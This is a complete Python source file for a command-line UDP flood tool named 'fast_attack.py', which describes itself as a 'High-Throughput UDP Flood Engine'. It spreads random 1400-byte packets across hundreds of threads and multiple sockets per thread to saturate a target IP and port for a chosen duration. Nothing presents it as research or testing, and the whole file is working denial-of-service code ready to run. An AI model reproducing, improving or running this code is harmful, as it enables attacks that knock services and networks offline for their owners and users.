"""
fast_attack.py - High-Throughput UDP Flood Engine
Multi-Socket, Blocking I/O, Thread Pooled, Pre-built Payloads.
"""

import socket
import time
import os
import threading
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass

@dataclass
class AttackStats:
    sent: int = 0
    failed: int = 0
    bytes_sent: int = 0
    is_running: bool = False
    start_time: float = 0.0

    @property
    def elapsed(self) -> float:
        return max(0.001, time.time() - self.start_time) if self.is_running else 0.001

    @property
    def rps(self) -> int:
        return int(self.sent / self.elapsed)


class FastUDPAttack:
    def __init__(self, threads: int = 500, packet_size: int = 1400, sockets_per_thread: int = 4):
        self.threads = threads
        self.packet_size = packet_size
        self.sockets_per_thread = sockets_per_thread
        self.stats = AttackStats()
        self._stop_event = threading.Event()
        self._executor = None
        self._futures = []

    def _build_socket(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
        try:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        except Exception:
            pass
        s.setblocking(True)
        return s

    def start(self, ip: str, port: int, duration: int) -> AttackStats:
        self._stop_event.clear()
        self.stats = AttackStats(
            is_running=True,
            start_time=time.time()
        )

        payloads = [os.urandom(self.packet_size) for _ in range(2048)]
        payload_count = len(payloads)
        target = (ip, port)
        sock_count = self.sockets_per_thread

        def worker():
            # Each worker owns its own sockets (no contention)
            socks = [self._build_socket() for _ in range(sock_count)]
            idx = 0
            local_sent = 0
            local_bytes = 0
            stop = self._stop_event
            sendto = None
            try:
                while not stop.is_set():
                    for s in socks:
                        try:
                            payload = payloads[idx % payload_count]
                            s.sendto(payload, target)
                            local_sent += 1
                            local_bytes += self.packet_size
                            idx += 1
                        except Exception:
                            pass
            finally:
                for s in socks:
                    try:
                        s.close()
                    except Exception:
                        pass
            return local_sent, local_bytes

        self._executor = ThreadPoolExecutor(max_workers=self.threads)
        self._futures = [self._executor.submit(worker) for _ in range(self.threads)]

        time.sleep(duration)

        self._stop_event.set()
        total_sent = 0
        total_bytes = 0
        for future in as_completed(self._futures, timeout=10):
            try:
                s, b = future.result()
                total_sent += s
                total_bytes += b
            except Exception:
                pass

        self._executor.shutdown(wait=False)

        self.stats.sent = total_sent
        self.stats.bytes_sent = total_bytes
        self.stats.is_running = False
        return self.stats

    def stop(self):
        self._stop_event.set()
        if self._executor:
            self._executor.shutdown(wait=False)


if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("Usage: spider <ip> <port> <duration> [threads] [packet_size]")
        sys.exit(1)
    ip = sys.argv[1]
    port = int(sys.argv[2])
    duration = int(sys.argv[3])
    threads = int(sys.argv[4]) if len(sys.argv) > 4 else 500
    packet_size = int(sys.argv[5]) if len(sys.argv) > 5 else 1400

    atk = FastUDPAttack(threads=threads, packet_size=packet_size, sockets_per_thread=4)
    stats = atk.start(ip, port, duration)
    print(f"Sent: {stats.sent} packets | {stats.bytes_sent / (1024*1024):.2f} MB")
